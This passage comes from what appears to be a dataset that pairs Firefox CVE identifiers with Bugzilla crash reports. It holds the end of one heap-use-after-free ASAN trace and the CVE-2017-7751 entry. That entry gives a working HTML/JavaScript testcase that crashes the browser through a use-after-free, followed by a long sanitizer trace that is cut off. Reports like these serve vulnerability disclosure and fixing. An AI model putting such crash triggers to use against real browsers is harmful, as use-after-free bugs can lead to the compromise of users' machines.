0x7f30ca941be9 in SetVisibility /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6513:9 #6 0x7f30ca941be9 in non-virtual thunk to nsDocShell::SetVisibility(bool) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6503 #7 0x7f30c4771941 in nsFrameLoader::Show(int, int, int, int, nsSubDocumentFrame*) /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:1140:15 #8 0x7f30c894f641 in nsSubDocumentFrame::ShowViewer() /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:185:22 #9 0x7f30c89c85e4 in AsyncFrameInit::Run() /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:92:60 #10 0x7f30c431d81f in nsContentUtils::RemoveScriptBlocker() /home/worker/workspace/build/src/dom/base/nsContentUtils.cpp:5362:15 #11 0x7f30c851f023 in ~nsAutoScriptBlocker /home/worker/workspace/build/src/obj-firefox/dist/include/nsContentUtils.h:2986:5 #12 0x7f30c851f023 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4210 #13 0x7f30c46fd041 in FlushPendingNotifications /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:599:5 #14 0x7f30c46fd041 in nsDocument::FlushPendingNotifications(mozilla::FlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8056 #15 0x7f30c44e7118 in GetPrimaryFrame /home/worker/workspace/build/src/dom/base/Element.cpp:2176:10 #16 0x7f30c44e7118 in mozilla::dom::Element::GetBoundingClientRect() /home/worker/workspace/build/src/dom/base/Element.cpp:967 #17 0x7f30c5bbe7bc in mozilla::dom::ElementBinding::getBoundingClientRect(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Element*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/ElementBinding.cpp:2086:59 #18 0x7f30c609344e in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2953:13 #19 0x7f30cb8ccc63 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #20 0x7f30cb8ccc63 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:455 #21 0x7f30cb8b568f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:506:12 #22 0x7f30cb8b568f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2997 #23 0x7f30cb89bb28 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:395:12 #24 0x7f30cb8ccde8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473:15 #25 0x7f30cb8cd612 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:519:10 #26 0x7f30cc4e08ee in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #27 0x7f30cc497f94 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:23 #28 0x7f30cc4c1153 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:21 #29 0x7f30cc4c3ab7 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #30 0x7f30cb8ccfb3 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #31 0x7f30cb8ccfb3 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:437 #32 0x7f30cb8cd612 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:519:10 #33 0x7f30cc24c17b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2885:12 #34 0x7f30c5b071c4 in mozilla::dom::OnErrorEventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::EventOrString const&, mozilla::dom::Optional<nsAString> const&, mozilla::dom::Optional<unsigned int> const&, mozilla::dom::Optional<unsigned int> const&, mozilla::dom::Optional<JS::Handle<JS::Value> > const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:398:37 #35 0x7f30c649ae83 in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:532:12 #36 0x7f30c649ae83 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:166 #37 0x7f30c64670e2 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1123:51 #38 0x7f30c6468ecc in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1297:20 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/view/nsViewManager.h:373:51 in RootViewManager Shadow bytes around the buggy address: 0x0c0c8005baa0: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd 0x0c0c8005bab0: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa 0x0c0c8005bac0: fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd 0x0c0c8005bad0: fd fd fd fd fa fa fa fa 00 00 00 00 00 00 00 00 0x0c0c8005bae0: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa =>0x0c0c8005baf0: fd fd fd fd fd fd[fd]fd fa fa fa fa fd fd fd fd 0x0c0c8005bb00: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd 0x0c0c8005bb10: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa 0x0c0c8005bb20: fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd 0x0c0c8005bb30: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd 0x0c0c8005bb40: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==10317==ABORTING"
      }
    ],
    "CVE-2017-7751": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1363396",
        "title": "heap-use-after-free in nsDocViewerSelectionListener::NotifySelectionChanged",
        "description": "The following testcase crashes the latest ASAN build of Firefox (BuildID=20170509120348) <script> function start() { o8=document.documentElement.querySelector('*:not([id])'); o18=document.createElement('iframe'); o8.remove(); o29=document.createElement('iframe'); o296=document.createElementNS('http://www.w3.org/2000/svg','feMergeNode'); window.top.document.documentElement.appendChild(o296); o18.setAttribute('src','javascript:undefined;'); o296.replaceWith(o18); o610=o18.contentWindow; o611=o610.document; o612=o611.documentElement; o612.innerHTML=\"<textarea></textarea><section contenteditable>\"; window.top.document.documentElement.appendChild(o29); window.setTimeout(fun0, 4); } function fun0() { o971=o610.getSelection(); o29.contentWindow.onresize=fun1; o29.width=1; o971.modify('move', 'right','lineboundary'); location.reload(); } function fun1() { document.documentElement.appendChild(o18); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==12670==ERROR: AddressSanitizer: heap-use-after-free on address 0x612000077db0 at pc 0x7f538d68e6a3 bp 0x7ffca030da10 sp 0x7ffca030da08 READ of size 8 at 0x612000077db0 thread T0 (Web Content) #0 0x7f538d68e6a2 in operator bool /home/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:758:45 #1 0x7f538d68e6a2 in GetDocumentSelection /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2637 #2 0x7f538d68e6a2 in nsDocViewerSelectionListener::NotifySelectionChanged(nsIDOMDocument*, nsISelection*, short) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:3741 #3 0x7f538d9a2a54 in mozilla::dom::Selection::NotifySelectionListeners() /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:6489:28 #4 0x7f538d99f6b4 in nsFrameSelection::NotifySelectionListeners(mozilla::SelectionType) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:2441:23 #5 0x7f538d997208 in nsFrameSelection::TakeFocus(nsIContent*, unsigned int, unsigned int, mozilla::CaretAssociationHint, bool, bool) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:1891:10 #6 0x7f538d99261b in nsFrameSelection::MoveCaret(nsDirection, bool, nsSelectionAmount, nsFrameSelection::CaretMovementStyle) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:1166:14 #7 0x7f538d9bfa68 in mozilla::dom::Selection::Modify(nsAString const&, nsAString const&, nsAString const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:6665:24 #8 0x7f538a44f7a9 in mozilla::dom::SelectionBinding::modify(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Selection*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/SelectionBinding.cpp:886:9 #9 0x7f538b14f95e in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2954:13 #10 0x7f5390944753 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #11 0x7f5390944753 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470 #12 0x7f5390945102 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #13 0x7f5391575cce in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:166:12 #14 0x7f539152bef9 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:23 #15 0x7f5391556443 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:479:21 #16 0x7f5391558e17 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:739:12 #17 0x7f5390944aa3 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #18 0x7f5390944aa3 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:452 #19 0x7f539092d2ff in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12 #20 0x7f539092d2ff in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3025 #21 0x7f5390913258 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12 #22 0x7f53909448d8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15 #23 0x7f5390945102 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #24 0x7f53912d718b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2891:12 #25 0x7f538acf5c25 in mozilla::dom::Function::Call(JSContext*, JS::Handle<JS::Value>, nsTArray<JS::Value> const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/FunctionBinding.cpp:36:8 #26 0x7f53894cc242 in Call<nsCOMPtr<nsISupports> > /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/FunctionBinding.h:72:12 #27 0x7f53894cc242 in nsGlobalWindow::RunTimeoutHandler(mozilla::dom::Timeout*, nsIScriptContext*) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:13106 #28 0x7f5389677ddb in mozilla::dom::TimeoutManager::RunTimeout(mozilla::dom::Timeout*) /home/worker/workspace/build/src/dom/base/TimeoutManager.cpp:720:42 #29 0x7f5389673444 in mozilla::dom::(anonymous namespace)::TimerCallback(nsITimer*, void*) /home/worker/workspace/build/src/dom/base/Timeout.cpp:65:49 #30 0x7f5386ef8887 in nsTimerImpl::Fire(int) /home/worker/workspace/build/src/xpcom/threads/nsTimerImpl.cpp:499:7 #31 0x7f5386ec66db in nsTimerEvent::Run() /home/worker/workspace/build/src/xpcom/threads/TimerThread.cpp:284:11 #32 0x7f5386ed9a42 in mozilla::ThrottledEventQueue::Inner::ExecuteRunnable() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:200:22 #33 0x7f5386ed934f in mozilla::ThrottledEventQueue::Inner::Executor::Run() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:74:15 #34 0x7f5386ebd2d1 in mozilla::SchedulerGroup::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:259:32 #35 0x7f5386eeac50 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1270:14 #36 0x7f5386ee7698 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:393:10 #37 0x7f5387c79cd1 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #38 0x7f5387bdd1d0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #39 0x7f5387bdd1d0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #40 0x7f5387bdd1d0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #41 0x7f538ce81d0f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #42 0x7f539048ba17 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:893:22 #43 0x7f5387bdd1d0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #44 0x7f5387bdd1d0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #45 0x7f5387bdd1d0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #46 0x7f539048b545 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:709:34 #47 0x4eb5c3 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #48 0x4eb5c3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #49 0x7f53a260082f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 #50 0x41cf18 in _start (/home/nils/fuzzer3/firefox/firefox+0x41cf18) 0x612000077db0 is located 112 bytes inside of 296-byte region [0x612000077d40,0x612000077e68) freed by thread T0 (Web Content) here: #0 0x4bb44b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7f538d670105 in nsDocumentViewer::Release() /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:559:1 #2 0x7f538f961a45 in assign_assuming_AddRef /home/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:334:7 #3 0x7f538f961a45 in operator= /home/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:600 #4 0x7f538f961a45 in nsDocShell::Destroy() /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5872 #5 0x7f538f9ad32f in non-virtual thunk to nsDocShell::Destroy() /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5796:13 #6 0x7f5389826da4 in nsFrameLoader::DestroyDocShell() /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:2144:15 #7 0x7f5389826b05 in nsFrameLoaderDestroyRunnable::Run() /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:2082:19 #8 0x7f538977e5fd in nsDocument::MaybeInitializeFinalizeFrameLoaders() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:7279:22 #9 0x7f538977dda6 in nsDocument::EndUpdate(unsigned int) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:5111:3 #10 0x7f538b94113c in nsHTMLDocument::EndUpdate(unsigned int) /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2495:15 #11 0x7f538987354e in ~mozAutoDocUpdate /home/worker/workspace/build/src/dom/base/mozAutoDocUpdate.h:40:18 #12 0x7f538987354e in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsINode.cpp:2244 #13 0x7f5389ee8d59 in InsertBefore /home/worker/workspace/build/src/dom/base/nsINode.h:1825:12 #14 0x7f5389ee8d59 in AppendChild /home/worker/workspace/build/src/dom/base/nsINode.h:1829 #15 0x7f5389ee8d59 in mozilla::dom::NodeBinding::appendChild(JSContext*, JS::Handle<JSObject*>, nsINode*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/NodeBinding.cpp:856 #16 0x7f538b14f95e in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2954:13 #17 0x7f5390944753 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #18 0x7f5390944753 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470 #19 0x7f539092d2ff in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12 #20 0x7f539092d2ff in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3025 #21 0x7f5390913258 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12 #22 0x7f53909448d8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15 #23 0x7f5390945102 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #24 0x7f5391575cce in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:166:12 #25 0x7f539152bef9 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:23 #26 0x7f5391556443 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:479:21 #27 0x7f5391558e17 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:739:12 #28 0x7f5390944aa3 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #29 0x7f5390944aa3 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:452 #30 0x7f5390945102 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #31 0x7f53912d718b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2891:12 #32 0x7f538abaf665 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #33 0x7f538b54455b in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #34 0x7f538b54455b in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #35 0x7f538b510059 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1147:51 #36 0x7f538b511e23 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1321:20 #37 0x7f538b4f25c1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:464:16 #38 0x7f538b4f59a2 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:825:9 previously allocated by thread T0 (Web Content) here: #0 0x4bb79c in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ec75d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f538d66f253 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f538d66f253 in NS_NewContentViewer() /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:478 #4 0x7f538df829e2 in nsContentDLF::CreateInstanceForDocument(nsISupports*, nsIDocument*, char const*, nsIContentViewer**) /home/worker/workspace/build/src/layout/build/nsContentDLF.cpp:255:46 #5 0x7f538f9c8230 in nsDocShell::CreateAboutBlankContentViewer(nsIPrincipal*, nsIURI*, bool, bool) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:8160:19 #6 0x7f538f96888f in nsDocShell::EnsureContentViewer() /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:8022:17 #7 0x7f538f99ccb7 in GetDocument /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:4572:3 #8 0x7f538f99ccb7 in non-virtual thunk to nsDocShell::GetDocument() /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:4570 #9 0x7f53894e3caa in nsPIDOMWindow<mozIDOMWindowProxy>::MaybeCreateDoc() /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:4117:48 #10 0x7f538b97432d in GetDoc /home/worker/workspace/build/src/dom/base/nsPIDOMWindow.h:213:7 #11 0x7f538b97432d in EnsureInnerWindow /home/worker/workspace/build/src/dom/base/nsPIDOMWindow.h:954 #12 0x7f538b97432d in nsJSChannel::AsyncOpen(nsIStreamListener*, nsISupports*) /home/worker/workspace/build/src/dom/jsurl/nsJSProtocolHandler.cpp:581 #13 0x7f538b976599 in nsJSChannel::AsyncOpen2(nsIStreamListener*) /home/worker/workspace/build/src/dom/jsurl/nsJSProtocolHandler.cpp:679:10 #14 0x7f53887a5f38 in nsURILoader::OpenURI(nsIChannel*, unsigned int, nsIInterfaceRequestor*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:857:19 #15 0x7f538f9786fd in nsDocShell::DoChannelLoad(nsIChannel*, nsIURILoader*, bool) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:11551:20 #16 0x7f538f9d98be in nsDocShell::DoURILoad(nsIURI*, nsIURI*, bool, nsIURI*, bool, unsigned int, nsIPrincipal*, nsIPrincipal*, char const*, nsAString const&, nsIInputStream*, nsIInputStream*, bool, nsIDocShell**, nsIRequest**, bool, bool, bool, nsAString const&, nsIURI*, unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:11365:8 #17 0x7f538f9754af in nsDocShell::InternalLoad(nsIURI*, nsIURI*, bool, nsIURI*, unsigned int, nsIPrincipal*, nsIPrincipal*, unsigned int, nsAString const&, char const*, nsAString const&, nsIInputStream*, nsIInputStream*, unsigned int, nsISHEntry*, bool, nsAString const&, nsIDocShell*, nsIURI*, bool, nsIDocShell**, nsIRequest**) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:10804:8 #18 0x7f538f96c2bb in nsDocShell::LoadURI(nsIURI*, nsIDocShellLoadInfo*, unsigned int, bool) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:1571:10 #19 0x7f538981112a in nsFrameLoader::ReallyStartLoadingInternal() /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:875:19 #20 0x7f538977e440 in ReallyStartLoading /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:759:17 #21 0x7f538977e440 in nsDocument::MaybeInitializeFinalizeFrameLoaders() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:7271 #22 0x7f538977dda6 in nsDocument::EndUpdate(unsigned int) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:5111:3 #23 0x7f538b94113c in nsHTMLDocument::EndUpdate(unsigned int) /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2495:15 #24 0x7f5389874d2b in ~mozAutoDocUpdate /home/worker/workspace/build/src/dom/base/mozAutoDocUpdate.h:40:18 #25 0x7f5389874d2b in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsINode.cpp:2521 #26 0x7f5389870f12 in InsertBefore /home/worker/workspace/build/src/dom/base/nsINode.h:1825:12 #27 0x7f5389870f12 in nsINode::ReplaceWith(mozilla::dom::Sequence<mozilla::dom::OwningNodeOrString> const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsINode.cpp:1831 #28 0x7f538ac77224 in mozilla::dom::ElementBinding::replaceWith(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Element*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/ElementBinding.cpp:3538:9 #29 0x7f538b14f95e in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2954:13 #30 0x7f5390944753 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #31 0x7f5390944753 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470 #32 0x7f539092d2ff in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12 #33 0x7f539092d2ff in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3025 #34 0x7f5390913258 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12 #35 0x7f53909448d8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15 #36 0x7f5390945102 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) 